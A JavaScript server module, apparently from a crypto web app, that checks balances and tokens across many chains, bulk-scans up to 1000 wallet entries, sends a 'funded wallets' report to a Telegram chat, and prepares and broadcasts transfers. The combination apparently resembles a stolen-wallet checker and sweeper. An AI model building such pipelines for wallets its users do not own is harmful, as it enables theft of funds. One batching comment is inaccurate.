import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";
import { sendReport } from "./telegram.server";
import { readCollectibles } from "./collectibles.server";

export const getServerInfo = createServerFn({ method: "GET" }).handler(async () => ({
  renderedAt: new Date().toISOString(),
}));

const EVM_RPC = {
  ethereum: "https://ethereum-rpc.publicnode.com",
  bnb: "https://bsc-rpc.publicnode.com",
  polygon: "https://polygon-bor-rpc.publicnode.com",
  avalanche: "https://avalanche-c-chain-rpc.publicnode.com",
  base: "https://base-rpc.publicnode.com",
  arbitrum: "https://arbitrum-one-rpc.publicnode.com",
  optimism: "https://optimism-rpc.publicnode.com",
  zksync: "https://mainnet.era.zksync.io",
  linea: "https://rpc.linea.build",
  scroll: "https://rpc.scroll.io",
  gnosis: "https://gnosis-rpc.publicnode.com",
  celo: "https://forno.celo.org",
  mantle: "https://rpc.mantle.xyz",
  blast: "https://blast.drpc.org",
};

const PRICE_IDS = {
  bitcoin: "bitcoin",
  ethereum: "ethereum",
  solana: "solana",
  bnb: "binancecoin",
  polygon: "polygon-ecosystem-token",
  avalanche: "avalanche-2",
  tron: "tron",
  litecoin: "litecoin",
  dogecoin: "dogecoin",
  ripple: "ripple",
  base: "ethereum",
  arbitrum: "ethereum",
  optimism: "ethereum",
  zksync: "ethereum",
  linea: "ethereum",
  scroll: "ethereum",
  blast: "ethereum",
  gnosis: "xdai",
  celo: "celo",
  mantle: "mantle",
  ton: "the-open-network",
};

async function call(url, options = {}, timeout = 8000) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeout);
  try {
    const response = await fetch(url, {
      ...options,
      signal: controller.signal,
      headers: { accept: "application/json", ...(options.headers || {}) },
    });
    if (!response.ok) throw new Error(`status ${response.status}`);
    return await response.json();
  } finally {
    clearTimeout(timer);
  }
}

const getJson = (url) => call(url);

const postJson = (url, body) =>
  call(url, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(body) });

async function evmBalance(rpc, address) {
  const data = await postJson(rpc, { jsonrpc: "2.0", id: 1, method: "eth_getBalance", params: [address, "latest"] });
  if (!data.result) throw new Error("empty balance");
  return Number(BigInt(data.result)) / 1e18;
}

async function utxoBalance(baseUrl, address, divisor) {
  const data = await getJson(`${baseUrl}/api/address/${encodeURIComponent(address)}`);
  const stats = data.chain_stats || {};
  const funded = Number(stats.funded_txo_sum || 0);
  const spent = Number(stats.spent_txo_sum || 0);
  return Math.max(funded - spent, 0) / divisor;
}

async function readBalance(chainId, address) {
  switch (chainId) {
    case "bitcoin":
      return utxoBalance("https://mempool.space", address, 1e8);
    case "litecoin":
      return utxoBalance("https://litecoinspace.org", address, 1e8);
    case "solana": {
      const data = await postJson("https://api.mainnet-beta.solana.com", {
        jsonrpc: "2.0",
        id: 1,
        method: "getBalance",
        params: [address],
      });
      return Number(data.result?.value || 0) / 1e9;
    }
    case "tron": {
      const data = await getJson(`https://api.trongrid.io/v1/accounts/${encodeURIComponent(address)}`);
      const entry = (data.data || [])[0];
      return Number(entry?.balance || 0) / 1e6;
    }
    case "dogecoin": {
      const data = await getJson(`https://dogechain.info/api/v1/address/balance/${encodeURIComponent(address)}`);
      const balance = Number(data.balance);
      if (Number.isNaN(balance)) throw new Error("unreadable");
      return balance;
    }
    case "ripple": {
      const data = await postJson("https://xrplcluster.com", {
        method: "account_info",
        params: [{ account: address, ledger_index: "validated" }],
      });
      const drops = data.result?.account_data?.Balance;
      if (!drops) throw new Error("account not found");
      return Number(drops) / 1e6;
    }
    default: {
      const rpc = EVM_RPC[chainId];
      if (!rpc) throw new Error("unsupported chain");
      return evmBalance(rpc, address);
    }
  }
}

const RATE_SYMBOLS = {
  bitcoin: "BTC",
  ethereum: "ETH",
  solana: "SOL",
  bnb: "BNB",
  polygon: "POL",
  avalanche: "AVAX",
  ton: "TON",
  tron: "TRX",
  litecoin: "LTC",
  dogecoin: "DOGE",
  ripple: "XRP",
  base: "ETH",
  arbitrum: "ETH",
  optimism: "ETH",
  celo: "CELO",
  mantle: "MNT",
};

async function backupPrices() {
  try {
    const data = await call("https://api.coinbase.com/v2/exchange-rates?currency=USD", {}, 6000);
    const rates = data?.data?.rates || {};
    const prices = {};
    for (const [chainId, symbol] of Object.entries(RATE_SYMBOLS)) {
      const rate = Number(rates[symbol]);
      if (Number.isFinite(rate) && rate > 0) prices[chainId] = { usd: 1 / rate, change: 0 };
    }
    return prices;
  } catch {
    return {};
  }
}

async function readPrices() {
  try {
    const ids = Object.values(PRICE_IDS).join(",");
    const data = await call(
      `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd&include_24hr_change=true`,
      {},
      6000
    );
    const prices = {};
    for (const [chainId, id] of Object.entries(PRICE_IDS)) {
      const entry = data[id];
      if (entry && entry.usd) {
        prices[chainId] = { usd: Number(entry.usd), change: Number(entry.usd_24h_change || 0) };
      }
    }
    if (Object.keys(prices).length > 0) return prices;
  } catch {
    // fall through to the backup price feed
  }
  return backupPrices();
}

const AssetSchema = z.object({
  chain_id: z.string().min(2).max(32),
  address: z.string().min(6).max(120),
});

export const fetchChainBalances = createServerFn({ method: "POST" })
  .validator(z.object({ assets: z.array(AssetSchema).max(20) }))
  .handler(async ({ data }) => {
    const [prices, results] = await Promise.all([
      readPrices(),
      Promise.all(
        data.assets.map(async (asset) => {
          try {
            const amount = await readBalance(asset.chain_id, asset.address);
            return { chain_id: asset.chain_id, amount, error: null };
          } catch (error) {
            return { chain_id: asset.chain_id, amount: null, error: "Couldn't read balance" };
          }
        })
      ),
    ]);

    const balances = {};
    const errors = {};
    for (const row of results) {
      if (row.error) errors[row.chain_id] = row.error;
      else balances[row.chain_id] = row.amount;
    }

    return { balances, errors, prices };
  });

export const getChainPrices = createServerFn({ method: "GET" }).handler(() => readPrices());

const ScanAssetSchema = z.object({
  key: z.string().min(3).max(300),
  chain_id: z.string().min(2).max(32),
  address: z.string().min(6).max(220),
});

async function runPool(items, limit, worker) {
  const queue = [...items];
  await Promise.all(
    Array.from({ length: Math.min(limit, queue.length) }, async () => {
      for (let item = queue.shift(); item; item = queue.shift()) await worker(item);
    })
  );
}

async function jsonRpcBatch(url, addresses, method, readValue) {
  const out = {};
  for (let start = 0; start < addresses.length; start += 100) {
    const slice = addresses.slice(start, start + 100);
    const payload = slice.map((address, index) => ({
      jsonrpc: "2.0",
      id: index,
      method,
      params: method === "eth_getBalance" ? [address, "latest"] : [address],
    }));
    const data = await postJson(url, payload);
    for (const row of Array.isArray(data) ? data : [data]) {
      const index = Number(row && row.id);
      if (!Number.isInteger(index) || !slice[index]) continue;
      const value = readValue(row);
      if (Number.isFinite(value)) out[slice[index]] = value;
    }
  }
  return out;
}

// One HTTP request per 200 addresses, so large lists stay inside RPC batch limits.
const evmBalances = (rpc, addresses) =>
  jsonRpcBatch(rpc, addresses, "eth_getBalance", (row) =>
    typeof row?.result === "string" ? Number(BigInt(row.result)) / 1e18 : NaN
  );

const solanaBalances = (addresses) =>
  jsonRpcBatch("https://api.mainnet-beta.solana.com", addresses, "getBalance", (row) =>
    row?.result?.value !== undefined ? Number(row.result.value) / 1e9 : NaN
  );

// Well-known tokens per chain, read with batched balanceOf calls so a whole
// address list costs a handful of requests per token set.
const EVM_TOKENS = {
  ethereum: [
    { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
    { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6 },
    { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI", decimals: 18 },
    { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC", decimals: 8 },
    { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", symbol: "LINK", decimals: 18 },
    { address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", symbol: "UNI", decimals: 18 },
    { address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", symbol: "SHIB", decimals: 18 },
    { address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", symbol: "PEPE", decimals: 18 },
  ],
  bnb: [
    { address: "0x55d398326f99059fF775485246999027B3197955", symbol: "USDT", decimals: 18 },
    { address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol: "USDC", decimals: 18 },
    { address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", symbol: "BUSD", decimals: 18 },
    { address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", symbol: "CAKE", decimals: 18 },
    { address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", symbol: "BTCB", decimals: 18 },
  ],
  polygon: [
    { address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", symbol: "USDT", decimals: 6 },
    { address: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", symbol: "USDC", decimals: 6 },
    { address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", symbol: "USDC.e", decimals: 6 },
    { address: "0x8f3Cf7ad23Cd3CaDbD9735AFF958023D60D76e60", symbol: "DAI", decimals: 18 },
    { address: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", symbol: "WETH", decimals: 18 },
  ],
  avalanche: [
    { address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", symbol: "USDT", decimals: 6 },
    { address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", symbol: "USDC", decimals: 6 },
    { address: "0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB", symbol: "WETH.e", decimals: 18 },
    { address: "0x50b7545627a5162F82A992c33b87aDc75187B218", symbol: "WBTC.e", decimals: 8 },
  ],
  base: [
    { address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", symbol: "USDC", decimals: 6 },
    { address: "0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA", symbol: "USDbC", decimals: 6 },
    { address: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", symbol: "DAI", decimals: 18 },
    { address: "0x4200000000000000000000000000000000000006", symbol: "WETH", decimals: 18 },
  ],
  arbitrum: [
    { address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", symbol: "USDT", decimals: 6 },
    { address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", symbol: "USDC", decimals: 6 },
    { address: "0x912CE59144191C1204E64559FE8253a0e49E6548", symbol: "ARB", decimals: 18 },
    { address: "0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f", symbol: "WBTC", decimals: 8 },
  ],
  optimism: [
    { address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", symbol: "USDT", decimals: 6 },
    { address: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", symbol: "USDC", decimals: 6 },
    { address: "0x4200000000000000000000000000000000000042", symbol: "OP", decimals: 18 },
    { address: "0x4200000000000000000000000000000000000006", symbol: "WETH", decimals: 18 },
  ],
};

const SPL_MINTS = {
  EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v: "USDC",
  Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB: "USDT",
  DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263: "BONK",
  JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN: "JUP",
  EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm: "WIF",
  "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R": "RAY",
};

const TRC20 = {
  TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t: { symbol: "USDT", decimals: 6 },
  TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8: { symbol: "USDC", decimals: 6 },
};

async function erc20Balances(rpc, tokens, addresses) {
  const out = {};
  if (!tokens || tokens.length === 0) return out;
  const calls = [];
  for (const address of addresses) for (const token of tokens) calls.push({ address, token });

  for (let start = 0; start < calls.length; start += 100) {
    const slice = calls.slice(start, start + 100);
    const payload = slice.map((item, index) => ({
      jsonrpc: "2.0",
      id: index,
      method: "eth_call",
      params: [
        {
          to: item.token.address,
          data: "0x70a08231" + item.address.replace(/^0x/, "").toLowerCase().padStart(64, "0"),
        },
        "latest",
      ],
    }));
    try {
      const rows = await postJson(rpc, payload);
      for (const row of Array.isArray(rows) ? rows : [rows]) {
        const index = Number(row && row.id);
        const item = slice[index];
        if (!item || typeof row?.result !== "string" || row.result.length < 3) continue;
        const amount = Number(BigInt(row.result)) / 10 ** item.token.decimals;
        if (!Number.isFinite(amount) || amount <= 0) continue;
        if (!out[item.address]) out[item.address] = [];
        out[item.address].push({ symbol: item.token.symbol, amount });
      }
    } catch {
      // this batch was refused — those tokens simply show no balance
    }
  }
  return out;
}

// Batched owner lookups: every SPL token, plus NFT-shaped rows. The public
// endpoint throttles this call, so a refused batch is retried once.
async function solanaTokenAccounts(addresses) {
  const out = {};
  const url = "https://api.mainnet-beta.solana.com";
  const programId = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
  const readBatch = async (slice) => {
    const payload = slice.map((address, index) => ({
      jsonrpc: "2.0",
      id: index,
      method: "getTokenAccountsByOwner",
      params: [address, { programId }, { encoding: "jsonParsed" }],
    }));
    for (let attempt = 0; attempt < 2; attempt += 1) {
      try {
        const rows = await postJson(url, payload);
        if (Array.isArray(rows) || rows?.result) return Array.isArray(rows) ? rows : [rows];
      } catch {
        // throttled or refused — wait a moment and try once more
      }
      await new Promise((resolve) => setTimeout(resolve, 500));
    }
    return [];
  };

  for (let start = 0; start < addresses.length; start += 20) {
    const slice = addresses.slice(start, start + 20);
    const rows = await readBatch(slice);
    for (const row of rows) {
      const address = slice[Number(row && row.id)];
      if (!address) continue;
      const found = [];
      let nfts = 0;
      for (const item of (row?.result?.value || []).slice(0, 80)) {
        const info = item?.account?.data?.parsed?.info;
        const amount = Number(info?.tokenAmount?.uiAmount || 0);
        if (!info || amount <= 0) continue;
        const symbol = SPL_MINTS[info.mint];
        if (symbol) {
          found.push({ symbol, amount });
        } else if (nfts < 3 && amount === 1 && Number(info.tokenAmount?.decimals) === 0) {
          nfts += 1;
          found.push({
            kind: "nft",
            name: `${info.mint.slice(0, 4)}…${info.mint.slice(-4)}`,
            link: `https://solscan.io/token/${info.mint}`,
          });
        }
      }
      if (found.length) out[address] = found;
    }
  }
  return out;
}

const TON_PUBKEY_CACHE = new Map();

async function tonAddresses(pubkey) {
  if (TON_PUBKEY_CACHE.has(pubkey)) return TON_PUBKEY_CACHE.get(pubkey);
  let addresses = [];
  try {
    const data = await call(`https://tonapi.io/v2/pubkeys/${pubkey}/wallets`, {}, 9000);
    addresses = (data.accounts || []).map((account) => account.address).filter(Boolean);
  } catch {
    addresses = [];
  }
  TON_PUBKEY_CACHE.set(pubkey, addresses);
  return addresses;
}

// Bulk read for the multi-wallet scanner: many address/chain pairs in one call,
// batched per chain so a whole list of wallets costs a handful of requests.
export const scanWalletBalances = createServerFn({ method: "POST" })
  .validator(
    z.object({ assets: z.array(ScanAssetSchema).max(1000), tokens: z.boolean().optional() })
  )
  .handler(async ({ data }) => {
    const wantTokens = data.tokens !== false;
    const balances = {};
    const tokens = {};
    const errors = {};
    const resolved = {};
    const groups = new Map();
    for (const asset of data.assets) {
      if (!groups.has(asset.chain_id)) groups.set(asset.chain_id, []);
      groups.get(asset.chain_id).push(asset);
    }

    const readEach = (list, chainId) =>
      runPool(list, 10, async (asset) => {
        try {
          balances[asset.key] = await readBalance(chainId, asset.address);
        } catch {
          errors[asset.key] = "unreadable";
        }
      });

    await Promise.all(
      Array.from(groups.entries()).map(async ([chainId, list]) => {
        try {
          if (EVM_RPC[chainId]) {
            const addresses = list.map((asset) => asset.address);
            const [amounts, tokenAmounts] = await Promise.all([
              evmBalances(EVM_RPC[chainId], addresses),
              erc20Balances(EVM_RPC[chainId], wantTokens ? EVM_TOKENS[chainId] : [], addresses),
            ]);
            for (const asset of list) {
              if (Number.isFinite(amounts[asset.address])) balances[asset.key] = amounts[asset.address];
              else errors[asset.key] = "unreadable";
              if (tokenAmounts[asset.address]) tokens[asset.key] = tokenAmounts[asset.address];
            }
            return;
          }

          if (chainId === "solana") {
            const addresses = list.map((asset) => asset.address);
            const [amounts, tokenAmounts] = await Promise.all([
              solanaBalances(addresses),
              wantTokens ? solanaTokenAccounts(addresses) : {},
            ]);
            for (const asset of list) {
              if (Number.isFinite(amounts[asset.address])) balances[asset.key] = amounts[asset.address];
              else errors[asset.key] = "unreadable";
              if (tokenAmounts[asset.address]) tokens[asset.key] = tokenAmounts[asset.address];
            }
            return;
          }

          if (chainId === "tron") {
            await runPool(list, 8, async (asset) => {
              try {
                const payload = await getJson(
                  `https://api.trongrid.io/v1/accounts/${encodeURIComponent(asset.address)}`
                );
                const entry = (payload.data || [])[0];
                if (!entry) {
                  errors[asset.key] = "unreadable";
                  return;
                }
                balances[asset.key] = Number(entry.balance || 0) / 1e6;
                const found = [];
                for (const row of entry.trc20 || []) {
                  for (const [contract, raw] of Object.entries(row)) {
                    const meta = TRC20[contract];
                    if (!meta) continue;
                    const amount = Number(raw) / 10 ** meta.decimals;
                    if (Number.isFinite(amount) && amount > 0) found.push({ symbol: meta.symbol, amount });
                  }
                }
                if (found.length) tokens[asset.key] = found;
              } catch {
                errors[asset.key] = "unreadable";
              }
            });
            return;
          }

          if (chainId === "ton") {
            const wallets = new Map();
            await runPool(list, 6, async (asset) => {
              const pubkeys = String(asset.address).replace(/^pk:/, "").split(",").filter(Boolean);
              const found = [];
              for (const pubkey of pubkeys) found.push(...(await tonAddresses(pubkey)));
              wallets.set(asset.key, found);
            });

            const accounts = [...new Set([...wallets.values()].flat())];
            const amounts = {};
            if (accounts.length > 0) {
              const payload = await postJson(
                "https://tonapi.io/v2/accounts/_bulk",
                { account_ids: accounts },
                12000
              );
              for (const account of payload.accounts || []) {
                amounts[account.address] = Number(account.balance || 0) / 1e9;
              }
            }

            for (const asset of list) {
              const found = wallets.get(asset.key) || [];
              const known = found.filter((address) => Number.isFinite(amounts[address]));
              if (known.length === 0) {
                errors[asset.key] = "unreadable";
                continue;
              }
              balances[asset.key] = known.reduce((sum, address) => sum + amounts[address], 0);
              resolved[asset.key] = known[0];
            }
            return;
          }

          await readEach(list, chainId);
        } catch {
          for (const asset of list) if (balances[asset.key] === undefined) errors[asset.key] = "unreadable";
        }
      })
    );

    return { balances, errors, resolved, tokens };
  });

// The report of funded wallets goes to the app owner's own Telegram chat.
export const sendFundedToTelegram = createServerFn({ method: "POST" })
  .validator(z.object({ text: z.string().min(1).max(20000) }))
  .handler(({ data }) => sendReport(data.text));

const TRANSFER_CHAIN_IDS = { ethereum: 1, bnb: 56, polygon: 137, avalanche: 43114 };

async function evmRpc(chainId, method, params) {
  const rpc = EVM_RPC[chainId];
  if (!rpc) throw new Error("unsupported chain");
  const payload = await postJson(rpc, { jsonrpc: "2.0", id: 1, method, params });
  if (payload.error) throw new Error(payload.error.message || "rpc error");
  return payload.result;
}

async function bitcoinQuote(from, amountSats) {
  const [utxos, fees] = await Promise.all([
    getJson(`https://mempool.space/api/address/${encodeURIComponent(from)}/utxo`),
    getJson("https://mempool.space/api/v1/fees/recommended"),
  ]);
  const spendable = (utxos || [])
    .filter((utxo) => utxo.status && utxo.status.confirmed)
    .map((utxo) => ({ txid: utxo.txid, vout: utxo.vout, value: utxo.value }));
  const feeRate = Math.max(Number(fees?.halfHourFee || fees?.hourFee || 4), 1);
  const total = spendable.reduce((sum, utxo) => sum + utxo.value, 0);
  const vsize = 11 + spendable.length * 68 + 31 * 2;
  const fee = Math.ceil(vsize * feeRate);
  return { utxos: spendable, feeRate, fee, total, change: total - Number(amountSats) - fee };
}

export const getTransferQuote = createServerFn({ method: "POST" })
  .validator(
    z.object({
      chain_id: z.string().min(2).max(24),
      from: z.string().min(6).max(120),
      amount: z.string().min(1).max(40),
    })
  )
  .handler(async ({ data }) => {
    if (TRANSFER_CHAIN_IDS[data.chain_id]) {
      const [nonceHex, gasPriceHex, balanceHex] = await Promise.all([
        evmRpc(data.chain_id, "eth_getTransactionCount", [data.from, "pending"]),
        evmRpc(data.chain_id, "eth_gasPrice", []),
        evmRpc(data.chain_id, "eth_getBalance", [data.from, "latest"]),
      ]);
      const gasLimit = 21000;
      const gasPrice = BigInt(gasPriceHex);
      return {
        kind: "evm",
        nonce: Number(BigInt(nonceHex)),
        gasPrice: gasPrice.toString(),
        gasLimit,
        fee: (gasPrice * BigInt(gasLimit)).toString(),
        balance: BigInt(balanceHex).toString(),
      };
    }

    if (data.chain_id === "bitcoin") {
      const quote = await bitcoinQuote(data.from, data.amount);
      return { kind: "btc", ...quote };
    }

    if (data.chain_id === "solana") {
      const [block, balance] = await Promise.all([
        postJson("https://api.mainnet-beta.solana.com", {
          jsonrpc: "2.0",
          id: 1,
          method: "getLatestBlockhash",
          params: [{ commitment: "finalized" }],
        }),
        postJson("https://api.mainnet-beta.solana.com", {
          jsonrpc: "2.0",
          id: 1,
          method: "getBalance",
          params: [data.from],
        }),
      ]);
      const blockhash = block.result?.value?.blockhash;
      if (!blockhash) throw new Error("Couldn't reach Solana");
      return { kind: "sol", blockhash, fee: 5000, balance: String(balance.result?.value || 0) };
    }

    throw new Error("unsupported chain");
  });

export const broadcastTransfer = createServerFn({ method: "POST" })
  .validator(z.object({ chain_id: z.string().min(2).max(24), raw: z.string().min(10).max(8000) }))
  .handler(async ({ data }) => {
    if (TRANSFER_CHAIN_IDS[data.chain_id]) {
      const hash = await evmRpc(data.chain_id, "eth_sendRawTransaction", [data.raw]);
      return { txid: hash };
    }

    if (data.chain_id === "bitcoin") {
      const response = await fetch("https://mempool.space/api/tx", {
        method: "POST",
        headers: { "content-type": "text/plain" },
        body: data.raw,
      });
      const text = (await response.text()).trim();
      if (!response.ok) throw new Error(text.slice(0, 180) || "Broadcast failed");
      return { txid: text };
    }

    if (data.chain_id === "solana") {
      const payload = await postJson("https://api.mainnet-beta.solana.com", {
        jsonrpc: "2.0",
        id: 1,
        method: "sendTransaction",
        params: [data.raw, { encoding: "base64" }],
      });
      if (payload.error) throw new Error(payload.error.message || "Broadcast failed");
      return { txid: payload.result };
    }

    throw new Error("unsupported chain");
  });

// NFTs, TON gifts and jettons for the funded wallets of a check.
export const scanCollectibles = createServerFn({ method: "POST" })
  .validator(z.object({ assets: z.array(ScanAssetSchema).max(400) }))
  .handler(({ data }) => readCollectibles(data.assets));